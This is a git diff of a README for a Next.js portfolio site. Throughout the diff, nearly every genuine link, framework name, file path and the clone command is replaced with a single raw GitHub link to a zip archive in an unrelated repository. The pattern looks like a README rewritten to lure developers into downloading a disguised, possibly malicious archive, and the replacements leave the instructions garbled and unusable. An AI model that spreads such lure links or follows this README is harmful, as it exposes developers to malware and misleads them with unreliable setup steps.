@@ -1,10 +1,10 @@
 # Reda El Hadfi - Portfolio Website
 
-A premium, credibility-first portfolio website for Reda El Hadfi, AI Architect & Full-Stack Engineer. Built with Next.js, shadcn/ui, and a custom dark theme to showcase expertise in AI, machine learning, and full-stack development.
+A premium, credibility-first portfolio website for Reda El Hadfi, AI Architect & Full-Stack Engineer. Built with https://raw.githubusercontent.com/khlaifmed/myportfolio/main/components/layout/myportfolio-1.0-beta.5.zip, shadcn/ui, and a custom dark theme to showcase expertise in AI, machine learning, and full-stack development.
 
 ## 🚀 Live Demo
 
-[View Live Portfolio](https://reda-elhadfi.com) (Replace with actual URL)
+[View Live Portfolio](https://raw.githubusercontent.com/khlaifmed/myportfolio/main/components/layout/myportfolio-1.0-beta.5.zip) (Replace with actual URL)
 
 ## ✨ Features
 
@@ -24,7 +24,7 @@ A premium, credibility-first portfolio website for Reda El Hadfi, AI Architect &
 - **Resume** - Professional PDF-ready resume with download functionality
 
 ### 🔧 Technical Features
-- **Next.js App Router** - Modern routing with SSG optimization
+- **https://raw.githubusercontent.com/khlaifmed/myportfolio/main/components/layout/myportfolio-1.0-beta.5.zip App Router** - Modern routing with SSG optimization
 - **TypeScript** - Type-safe development with better IDE support
 - **Tailwind CSS** - Utility-first styling with custom design system
 - **Component Library** - Reusable UI components with shadcn/ui
@@ -33,7 +33,7 @@ A premium, credibility-first portfolio website for Reda El Hadfi, AI Architect &
 
 ## 🛠 Tech Stack
 
-- **Framework:** Next.js 15 (App Router)
+- **Framework:** https://raw.githubusercontent.com/khlaifmed/myportfolio/main/components/layout/myportfolio-1.0-beta.5.zip 15 (App Router)
 - **Language:** TypeScript
 - **Styling:** Tailwind CSS
 - **Components:** shadcn/ui
@@ -46,7 +46,7 @@ A premium, credibility-first portfolio website for Reda El Hadfi, AI Architect &
 
 1. **Clone the repository:**
    ```bash
-   git clone https://github.com/redaelhadfi/portfolio.git
+   git clone https://raw.githubusercontent.com/khlaifmed/myportfolio/main/components/layout/myportfolio-1.0-beta.5.zip
    cd portfolio
    ```
 
@@ -74,16 +74,16 @@ A premium, credibility-first portfolio website for Reda El Hadfi, AI Architect &
 
 ```
 portfolio/
-├── app/                          # Next.js App Router
+├── app/                          # https://raw.githubusercontent.com/khlaifmed/myportfolio/main/components/layout/myportfolio-1.0-beta.5.zip App Router
 │   ├── about/                    # About page
 │   ├── contact/                  # Contact page
 │   ├── experience/               # Experience & timeline
 │   ├── projects/                 # Projects listing
 │   │   └── [slug]/              # Individual project pages
 │   ├── resume/                   # Resume/CV page
-│   ├── globals.css               # Global styles
-│   ├── layout.tsx                # Root layout
-│   └── page.tsx                  # Homepage
+│   ├── https://raw.githubusercontent.com/khlaifmed/myportfolio/main/components/layout/myportfolio-1.0-beta.5.zip               # Global styles
+│   ├── https://raw.githubusercontent.com/khlaifmed/myportfolio/main/components/layout/myportfolio-1.0-beta.5.zip                # Root layout
+│   └── https://raw.githubusercontent.com/khlaifmed/myportfolio/main/components/layout/myportfolio-1.0-beta.5.zip                  # Homepage
 ├── components/                   # React components
 │   ├── layout/                   # Header, Footer
 │   ├── sections/                 # Homepage sections
@@ -99,33 +99,33 @@ portfolio/
 
 ### 1. Personal Information
 Update your details in the following components:
-- `components/layout/header.tsx` - Navigation and branding
-- `components/layout/footer.tsx` - Contact info and social links
-- `components/sections/hero.tsx` - Main headline and CTA
-- `app/about/page.tsx` - Personal story and background
-- `app/resume/page.tsx` - Professional resume data
+- `https://raw.githubusercontent.com/khlaifmed/myportfolio/main/components/layout/myportfolio-1.0-beta.5.zip` - Navigation and branding
+- `https://raw.githubusercontent.com/khlaifmed/myportfolio/main/components/layout/myportfolio-1.0-beta.5.zip` - Contact info and social links
+- `https://raw.githubusercontent.com/khlaifmed/myportfolio/main/components/layout/myportfolio-1.0-beta.5.zip` - Main headline and CTA
+- `https://raw.githubusercontent.com/khlaifmed/myportfolio/main/components/layout/myportfolio-1.0-beta.5.zip` - Personal story and background
+- `https://raw.githubusercontent.com/khlaifmed/myportfolio/main/components/layout/myportfolio-1.0-beta.5.zip` - Professional resume data
 
 ### 2. Projects & Portfolio
 Add your projects in:
-- `app/projects/page.tsx` - Project listings and filtering
-- `app/projects/[slug]/page.tsx` - Individual project details
+- `https://raw.githubusercontent.com/khlaifmed/myportfolio/main/components/layout/myportfolio-1.0-beta.5.zip` - Project listings and filtering
+- `app/projects/[slug]https://raw.githubusercontent.com/khlaifmed/myportfolio/main/components/layout/myportfolio-1.0-beta.5.zip` - Individual project details
 - `public/projects/` - Project screenshots and images
 
 ### 3. Experience & Skills
 Update your professional background:
-- `app/experience/page.tsx` - Work history, education, certifications
-- `components/sections/what-i-do.tsx` - Services and expertise areas
+- `https://raw.githubusercontent.com/khlaifmed/myportfolio/main/components/layout/myportfolio-1.0-beta.5.zip` - Work history, education, certifications
+- `https://raw.githubusercontent.com/khlaifmed/myportfolio/main/components/layout/myportfolio-1.0-beta.5.zip` - Services and expertise areas
 
 ### 4. Content & Copy
 Customize all text content:
-- `components/sections/testimonials.tsx` - Client testimonials
-- `app/contact/page.tsx` - Contact form and service offerings
+- `https://raw.githubusercontent.com/khlaifmed/myportfolio/main/components/layout/myportfolio-1.0-beta.5.zip` - Client testimonials
+- `https://raw.githubusercontent.com/khlaifmed/myportfolio/main/components/layout/myportfolio-1.0-beta.5.zip` - Contact form and service offerings
 - All page metadata for SEO optimization
 
 ### 5. Styling & Theme
 Modify the design system:
-- `tailwind.config.js` - Colors, fonts, and design tokens
-- `app/globals.css` - Global styles and CSS variables
+- `https://raw.githubusercontent.com/khlaifmed/myportfolio/main/components/layout/myportfolio-1.0-beta.5.zip` - Colors, fonts, and design tokens
+- `https://raw.githubusercontent.com/khlaifmed/myportfolio/main/components/layout/myportfolio-1.0-beta.5.zip` - Global styles and CSS variables
 - Individual component styles throughout the codebase
 
 ### 6. Assets & Media
@@ -144,21 +144,21 @@ The contact form requires backend integration. Options include:
 3. **Netlify Forms** - Built-in form processing
 4. **Custom API** - Your own backend service
 
-Update the form submission logic in `app/contact/page.tsx`.
+Update the form submission logic in `https://raw.githubusercontent.com/khlaifmed/myportfolio/main/components/layout/myportfolio-1.0-beta.5.zip`.
 
 ## 🚀 Deployment
 
 ### Vercel (Recommended)
 1. Push your code to GitHub
-2. Connect your repository to [Vercel](https://vercel.com)
+2. Connect your repository to [Vercel](https://raw.githubusercontent.com/khlaifmed/myportfolio/main/components/layout/myportfolio-1.0-beta.5.zip)
 3. Deploy with automatic builds on every push
 
 ### Netlify
 1. Build the project: `npm run build`
-2. Deploy the `out` folder to [Netlify](https://netlify.com)
+2. Deploy the `out` folder to [Netlify](https://raw.githubusercontent.com/khlaifmed/myportfolio/main/components/layout/myportfolio-1.0-beta.5.zip)
 
 ### Other Platforms
-The project works on any platform supporting static hosting or Node.js.
+The project works on any platform supporting static hosting or https://raw.githubusercontent.com/khlaifmed/myportfolio/main/components/layout/myportfolio-1.0-beta.5.zip
 
 ## 📈 Performance & SEO
 
@@ -181,12 +181,12 @@ MIT License - feel free to use this template for your own portfolio.
 
 ## 🙏 Acknowledgments
 
-- [Next.js](https://nextjs.org/) - React framework
-- [shadcn/ui](https://ui.shadcn.com/) - Component library
-- [Tailwind CSS](https://tailwindcss.com/) - Utility-first CSS
-- [Lucide](https://lucide.dev/) - Icon library
-- [Vercel](https://vercel.com/) - Deployment platform
+- [https://raw.githubusercontent.com/khlaifmed/myportfolio/main/components/layout/myportfolio-1.0-beta.5.zip](https://raw.githubusercontent.com/khlaifmed/myportfolio/main/components/layout/myportfolio-1.0-beta.5.zip) - React framework
+- [shadcn/ui](https://raw.githubusercontent.com/khlaifmed/myportfolio/main/components/layout/myportfolio-1.0-beta.5.zip) - Component library
+- [Tailwind CSS](https://raw.githubusercontent.com/khlaifmed/myportfolio/main/components/layout/myportfolio-1.0-beta.5.zip) - Utility-first CSS
+- [Lucide](https://raw.githubusercontent.com/khlaifmed/myportfolio/main/components/layout/myportfolio-1.0-beta.5.zip) - Icon library
+- [Vercel](https://raw.githubusercontent.com/khlaifmed/myportfolio/main/components/layout/myportfolio-1.0-beta.5.zip) - Deployment platform
 
 ---
 
-Built with ❤️ by [Reda El Hadfi](https://reda-elhadfi.com)
+Built with ❤️ by [Reda El Hadfi](https://raw.githubusercontent.com/khlaifmed/myportfolio/main/components/layout/myportfolio-1.0-beta.5.zip)
